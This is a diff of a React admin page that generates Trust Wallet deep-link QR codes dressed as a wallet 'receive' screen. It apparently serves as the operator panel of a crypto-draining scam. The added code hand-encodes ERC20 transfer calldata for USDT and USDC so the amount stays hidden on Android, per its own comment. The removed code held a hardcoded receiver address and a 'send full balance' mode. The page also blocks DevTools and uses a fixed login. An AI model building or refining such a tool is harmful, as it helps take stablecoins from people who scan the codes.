@@ -2,11 +2,31 @@
 
 import { useState, useEffect, useRef } from "react";
 
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const TOKEN_DECIMALS = 6;
+
+function isValidAddress(addr: string): boolean {
+  return /^0x[a-fA-F0-9]{40}$/.test(addr);
+}
+
+function encodeTransferData(to: string, amount: string): string {
+  const signature = "a9059cbb";
+  const cleanAddr = to.toLowerCase().replace("0x", "");
+  if (cleanAddr.length !== 40) throw new Error("Invalid address length");
+  const addr = cleanAddr.padStart(64, "0");
+  const amountFloat = parseFloat(amount.replace(",", "."));
+  if (isNaN(amountFloat) || amountFloat <= 0) throw new Error("Invalid amount");
+  const amountWei = BigInt(Math.floor(amountFloat * 10 ** TOKEN_DECIMALS));
+  const amountHex = amountWei.toString(16).padStart(64, "0");
+  return "0x" + signature + addr + amountHex;
+}
+
 export default function AdminPage() {
-  const [receiverAddress, setReceiverAddress] = useState("0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf");
-  const [amount, setAmount] = useState("1");
-  const [isMaxMode, setIsMaxMode] = useState(false);
+  const [receiverAddress, setReceiverAddress] = useState("");
+  const [amount, setAmount] = useState("");
   const [token, setToken] = useState<"USDT" | "USDC">("USDT");
+  const [platform, setPlatform] = useState<"ios" | "android">("ios");
   const [qrUrl, setQrUrl] = useState("");
   const [isMounted, setIsMounted] = useState(false);
   const qrRef = useRef<HTMLDivElement>(null);
@@ -47,7 +67,6 @@ export default function AdminPage() {
     document.addEventListener("keydown", blockKeys);
     document.addEventListener("contextmenu", blockContextMenu);
 
-    // Détection DevTools (basée sur la différence de taille de la fenêtre)
     let devToolsOpen = false;
     const checkDevTools = () => {
       const threshold = 160;
@@ -74,16 +93,10 @@ export default function AdminPage() {
     };
   }, []);
 
-  // Chargement des préférences sauvegardées
+  // Chargement des préférences
   useEffect(() => {
     if (typeof window !== "undefined") {
-      const savedAddress = localStorage.getItem("admin_receiver_address");
-      const savedAmount = localStorage.getItem("admin_amount");
       const savedToken = localStorage.getItem("admin_token");
-      const savedMaxMode = localStorage.getItem("admin_max_mode");
-      if (savedAddress) setReceiverAddress(savedAddress);
-      if (savedAmount) setAmount(savedAmount);
-      if (savedMaxMode === "true") setIsMaxMode(true);
       if (savedToken === "USDT" || savedToken === "USDC") setToken(savedToken);
 
       const auth = sessionStorage.getItem("admin_auth");
@@ -94,62 +107,89 @@ export default function AdminPage() {
     }
   }, []);
 
-  // Génération du QR code et sauvegarde
+  // Génération du QR code
   useEffect(() => {
     if (!isMounted || typeof window === "undefined" || !isAuthenticated) return;
 
-    localStorage.setItem("admin_receiver_address", receiverAddress);
-    localStorage.setItem("admin_amount", amount);
     localStorage.setItem("admin_token", token);
-    localStorage.setItem("admin_max_mode", isMaxMode ? "true" : "false");
+
+    if (!receiverAddress || !isValidAddress(receiverAddress)) {
+      setQrUrl("");
+      qrCodeInstanceRef.current = null; // Reset QR instance so it re-creates on next valid URL
+      return;
+    }
 
     const origin = window.location.origin;
     const baseUrl = `${origin}/wallet`;
-    const params = {
-      to: receiverAddress,
-      amount: isMaxMode ? "max" : amount,
-      token: token.toLowerCase(),
-    };
-    const encoded = btoa(JSON.stringify(params));
-    const targetUrl = `${baseUrl}?data=${encodeURIComponent(encoded)}`;
-    const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
-    setQrUrl(trustWalletLink);
-  }, [receiverAddress, amount, token, isMaxMode, isMounted, isAuthenticated]);
 
-  // Rendu du QR code stylisé
+    const normalizedAmount = amount.replace(",", ".").trim();
+    if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
+      setQrUrl("");
+      qrCodeInstanceRef.current = null;
+      return;
+    }
+
+    if (platform === "ios") {
+      const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}`;
+      const coinId = 60;
+      const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
+      setQrUrl(trustWalletLink);
+    } else {
+      // Android Ethereum : send avec data, amount caché
+      try {
+        const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
+        const callData = encodeTransferData(receiverAddress, normalizedAmount);
+        const sendUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
+        setQrUrl(sendUrl);
+      } catch (err) {
+        console.error("Failed to encode transfer data", err);
+        setQrUrl("");
+        qrCodeInstanceRef.current = null;
+      }
+    }
+  }, [receiverAddress, amount, token, platform, isMounted, isAuthenticated]);
+
+  // Rendu du QR code
   useEffect(() => {
     if (!qrUrl || typeof window === "undefined" || !isMounted || !isAuthenticated) return;
 
-    import("qr-code-styling").then((QRCodeStylingModule) => {
-      const QRCodeStyling = QRCodeStylingModule.default;
-      const options = {
-        width: 260,
-        height: 260,
-        type: "svg" as const,
-        data: qrUrl,
-        image: "/trust.png",
-        dotsOptions: { color: "#000000", type: "extra-rounded" as const },
-        cornersSquareOptions: { color: "#000000", type: "extra-rounded" as const },
-        cornersDotOptions: { color: "#000000", type: "dot" as const },
-        backgroundOptions: { color: "#ffffff" },
-        imageOptions: { crossOrigin: "anonymous", margin: 6, imageSize: 0.35, hideBackgroundDots: true }
-      };
+    // Petit délai pour s'assurer que le DOM du qrCanvasRef est monté après le toggle qrUrl
+    const renderTimeout = setTimeout(() => {
+      import("qr-code-styling").then((QRCodeStylingModule) => {
+        const QRCodeStyling = QRCodeStylingModule.default;
+        const options = {
+          width: 240,
+          height: 240,
+          type: "svg" as const,
+          data: qrUrl,
+          image: "/trust.png",
+          dotsOptions: { color: "#000000", type: "extra-rounded" as const },
+          cornersSquareOptions: { color: "#000000", type: "extra-rounded" as const },
+          cornersDotOptions: { color: "#000000", type: "dot" as const },
+          backgroundOptions: { color: "#ffffff" },
+          imageOptions: { crossOrigin: "anonymous", margin: 6, imageSize: 0.35, hideBackgroundDots: true },
+        };
 
-      if (!qrCodeInstanceRef.current) {
-        qrCodeInstanceRef.current = new QRCodeStyling(options);
-        if (qrCanvasRef.current) {
-          qrCanvasRef.current.innerHTML = "";
-          qrCodeInstanceRef.current.append(qrCanvasRef.current);
+        if (qrCodeInstanceRef.current && qrCanvasRef.current && qrCanvasRef.current.childNodes.length > 0) {
+          // Instance exists and is still attached to the DOM — just update data
+          qrCodeInstanceRef.current.update(options);
+        } else {
+          // Fresh instance needed (first render or after DOM was destroyed/re-created)
+          qrCodeInstanceRef.current = new QRCodeStyling(options);
+          if (qrCanvasRef.current) {
+            qrCanvasRef.current.innerHTML = "";
+            qrCodeInstanceRef.current.append(qrCanvasRef.current);
+          }
         }
-      } else {
-        qrCodeInstanceRef.current.update(options);
-      }
-    });
+      });
+    }, 50); // 50ms ensures the conditional DOM node is mounted
+
+    return () => clearTimeout(renderTimeout);
   }, [qrUrl, isMounted, isAuthenticated]);
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    if (usernameInput === "USDT" && passwordInput === "SEND") {
+     if (usernameInput === "USDT" && passwordInput === "SEND") {
       setIsAuthenticated(true);
       setAuthError("");
       if (typeof window !== "undefined") sessionStorage.setItem("admin_auth", "true");
@@ -194,7 +234,7 @@ export default function AdminPage() {
     return (
       <main className="transfer-main">
         <div className="home-content" style={{ maxWidth: "400px" }}>
-          <h1 className="home-title" style={{ fontSize: "2rem", marginBottom: "1.5rem", color: "#0f172a" }}>
+          <h1 className="home-title" style={{ marginBottom: "1.5rem", color: "#0f172a" }}>
             Admin Access
           </h1>
           <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
@@ -246,11 +286,10 @@ export default function AdminPage() {
           Logout 🚪
         </button>
 
-        <h1 className="home-title" style={{ fontSize: "2rem", marginBottom: "1.5rem", color: "#0f172a" }}>
+        <h1 className="home-title" style={{ marginBottom: "1.5rem", color: "#0f172a" }}>
           Admin Dashboard
         </h1>
         
-        {/* Formulaire de configuration */}
         <div className="form-container" style={{ width: "100%", textAlign: "left", marginBottom: "2rem" }}>
           <label className="form-label">Select Asset</label>
           <div className="token-tabs">
@@ -258,36 +297,35 @@ export default function AdminPage() {
             <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
           </div>
 
-          <label className="form-label">Receiver Address</label>
-          <div className="input-row" style={{ marginBottom: "1.25rem" }}>
+          <label className="form-label" style={{ marginTop: "1.25rem" }}>Platform</label>
+          <div className="token-tabs">
+            <button type="button" className={`token-tab ${platform === "ios" ? "token-tab--active" : ""}`} onClick={() => setPlatform("ios")}>iOS (Wallet)</button>
+            <button type="button" className={`token-tab ${platform === "android" ? "token-tab--active" : ""}`} onClick={() => setPlatform("android")}>Android (Send)</button>
+          </div>
+
+          <label className="form-label" style={{ marginTop: "1rem" }}>Receiver Address</label>
+          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
             <input
               type="text" value={receiverAddress} onChange={(e) => setReceiverAddress(e.target.value)}
               className="input-row__field" placeholder="0x..."
             />
           </div>
+          {receiverAddress && !isValidAddress(receiverAddress) && (
+            <div style={{ color: "#ef4444", fontSize: "0.8rem", marginBottom: "1rem" }}>
+              Invalid Ethereum address (must be 0x followed by 40 hex characters).
+            </div>
+          )}
 
           <label className="form-label">Amount ({token})</label>
-          <div className="input-row" style={{ opacity: isMaxMode ? 0.4 : 1, pointerEvents: isMaxMode ? "none" : "auto" }}>
+          <div className="input-row">
             <input
-              type="text" ref={amountInputRef}
-              value={isMaxMode ? "Maximum" : amount}
-              onChange={(e) => setAmount(e.target.value)}
-              className="input-row__field" placeholder="1.0" readOnly={isMaxMode}
+              type="text" ref={amountInputRef} value={amount} onChange={(e) => setAmount(e.target.value)}
+              className="input-row__field" placeholder="1.0"
             />
           </div>
-          <label style={{ display: "flex", alignItems: "center", gap: "0.5rem", marginTop: "0.65rem", cursor: "pointer", userSelect: "none" }}>
-            <input
-              type="checkbox" checked={isMaxMode} onChange={(e) => setIsMaxMode(e.target.checked)}
-              style={{ width: "18px", height: "18px", accentColor: "#0033ff", cursor: "pointer" }}
-            />
-            <span style={{ fontSize: "0.88rem", fontWeight: 600, color: isMaxMode ? "#0033ff" : "#475569" }}>
-              Maximum — send full {token} balance
-            </span>
-          </label>
         </div>
 
-        {/* QR Code Section */}
-        <div className="admin-qr-section" style={{ background: "#ffffff", border: "1px solid #e2e8f0", borderRadius: "1.5rem", padding: "1.5rem", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)" }}>
+        <div className="admin-qr-section" style={{ background: "#ffffff", border: "1px solid #e2e8f0", borderRadius: "1.5rem", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)" }}>
           <div className="receive-header-bar">
             <button type="button" className="receive-header-btn">
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
@@ -313,8 +351,8 @@ export default function AdminPage() {
             </svg>
             <div className="receive-alert-text">
               {token === "USDT" 
-                ? "Send only Tether USD (ERC20) to this address. Other assets will be lost forever."
-                : "Send only USD Coin (ERC20) to this address. Other assets will be lost forever."}
+                  ? "Send only Tether USD (ERC20) to this address. Other assets will be lost forever."
+                  : "Send only USD Coin (ERC20) to this address. Other assets will be lost forever."}
             </div>
           </div>
 
@@ -339,8 +377,15 @@ export default function AdminPage() {
               )}
             </div>
           ) : (
-            <div style={{ width: 260, height: 260, display: "flex", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0 auto 1.5rem" }}>
-              <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#2563eb" }} />
+            <div style={{ width: 260, height: 260, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0 auto 1.5rem", padding: "1rem", textAlign: "center", color: "#64748b", fontSize: "0.9rem" }}>
+              <span style={{ fontSize: "2rem", marginBottom: "0.5rem" }}>🔑</span>
+              <div>
+                {!receiverAddress 
+                  ? "Enter a receiver address to generate QR Code"
+                  : !isValidAddress(receiverAddress)
+                  ? "Invalid address format"
+                  : "Enter a valid amount to generate QR Code"}
+              </div>
             </div>
           )}
 
@@ -379,7 +424,6 @@ export default function AdminPage() {
           </div>
         </div>
 
-        {/* Floating Toast Notification */}
         {toastMessage && <div className="copy-toast">{toastMessage}</div>}
       </div>
     </main>
